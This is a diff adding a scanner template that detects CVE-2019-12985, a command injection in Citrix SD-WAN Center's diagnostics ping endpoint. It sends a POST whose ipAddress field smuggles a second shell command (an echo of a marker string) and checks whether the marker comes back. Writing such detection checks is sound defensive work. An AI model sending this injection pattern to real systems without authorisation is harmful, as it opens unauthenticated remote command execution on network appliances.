@@ -1,0 +1,48 @@
+[info]
+author = "AVE"
+description = "检测 Citrix SD-WAN Center / NetScaler SD-WAN Center 管理界面的 DiagnosticsController ping 功能是否存在命令注入漏洞。通过向 /Collector/diagnostics/ping 发送特制请求，检测 ipAddress 参数是否被直接拼接到系统命令中执行。"
+id = "POC-AVE-2019-0058"
+name = "Citrix SD-WAN Center 命令注入漏洞 PoC"
+severity = "critical"
+tags = [
+    "cve-2019-12985",
+    "citrix",
+    "rce",
+    "command-injection",
+]
+vuln_id = [
+    "CVE-2019-12985",
+    "AVE-2019-0058",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/login"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<title>Citrix SD-WAN</title>"]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/Collector/diagnostics/ping"
+protocol = "http"
+
+[poc.requests.body]
+content = "ipAddress=;echo+AVE_TEST_POC&pingCount=1&packetSize=56"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AVE_TEST_POC"]
